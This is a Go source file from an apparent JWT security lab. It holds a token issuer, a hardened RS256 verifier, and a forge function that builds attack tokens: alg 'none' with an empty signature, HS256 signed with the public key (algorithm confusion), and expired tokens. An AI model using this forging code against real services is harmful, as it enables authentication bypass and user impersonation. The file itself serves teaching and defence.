package main

import (
	"crypto"
	"crypto/hmac"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"time"

	"github.com/golang-jwt/jwt/v5"
)

const (
	issuer    = "http://localhost:4102" // the same string in the TS lab, whatever port that one listens on
	audience  = "lab02-api"
	accessTTL = 300 // seconds
	leeway    = 30 * time.Second
)

// issueAccess signs an RS256 access token. The kid header tells verifiers which JWKS key to use.
func issueAccess(k *Keys, sub, email string) (string, error) {
	now := time.Now().Unix()
	t := jwt.NewWithClaims(jwt.SigningMethodRS256, jwt.MapClaims{
		"iss": issuer, "aud": audience, "sub": sub, "email": email,
		"iat": now, "exp": now + accessTTL, "jti": newToken(),
	})
	t.Header["kid"] = k.KID
	return t.SignedString(k.Private)
}

// verifyAccess is the SECURE verifier: the algorithm is pinned to RS256 (the token's own alg header is never
// trusted), the signature must match our key, and exp (required), aud and iss are all checked.
func verifyAccess(k *Keys, token string) (map[string]any, error) {
	claims := jwt.MapClaims{}
	_, err := jwt.ParseWithClaims(token, claims, func(*jwt.Token) (any, error) { return k.Public, nil },
		jwt.WithValidMethods([]string{"RS256"}),
		jwt.WithExpirationRequired(),
		jwt.WithIssuer(issuer),
		jwt.WithAudience(audience),
		jwt.WithLeeway(leeway),
	)
	if err != nil {
		return nil, err
	}
	return claims, nil
}

func b64json(v any) (string, error) {
	b, err := json.Marshal(v)
	return base64.RawURLEncoding.EncodeToString(b), err
}

// forge builds the attack-demo tokens behind /__attack/sign. Nothing here needs a secret: none is unsigned,
// the HS256 key is the PUBLIC key, and "expired" is a normal token whose exp is in the past.
// header/payload may be nil; missing claims get useful defaults.
func forge(k *Keys, mode string, header, payload map[string]any) (string, error) {
	now := time.Now().Unix()
	h := map[string]any{"typ": "JWT"}
	p := map[string]any{"iss": issuer, "aud": audience, "sub": "forged-user", "email": "forged@example.com", "iat": now, "exp": now + accessTTL, "jti": newToken()}
	for name, v := range header {
		h[name] = v
	}
	for name, v := range payload {
		p[name] = v
	}
	switch mode {
	case "none":
		h["alg"] = "none"
	case "hs256-with-public-key":
		h["alg"] = "HS256"
		if _, ok := h["kid"]; !ok {
			h["kid"] = k.KID
		}
	case "expired":
		h["alg"] = "RS256"
		if _, ok := h["kid"]; !ok {
			h["kid"] = k.KID
		}
		p["iat"], p["exp"] = now-3900, now-3600 // always in the past, even if the caller sent a future exp
	default:
		return "", fmt.Errorf("unknown mode %q", mode)
	}
	hs, err := b64json(h)
	if err != nil {
		return "", err
	}
	ps, err := b64json(p)
	if err != nil {
		return "", err
	}
	in := hs + "." + ps
	switch mode {
	case "none":
		return in + ".", nil // empty signature
	case "hs256-with-public-key":
		mac := hmac.New(sha256.New, []byte(k.PublicPEM)) // the stored public_pem string, byte for byte
		mac.Write([]byte(in))
		return in + "." + base64.RawURLEncoding.EncodeToString(mac.Sum(nil)), nil
	}
	sum := sha256.Sum256([]byte(in))
	sig, err := rsa.SignPKCS1v15(rand.Reader, k.Private, crypto.SHA256, sum[:])
	return in + "." + base64.RawURLEncoding.EncodeToString(sig), err
}
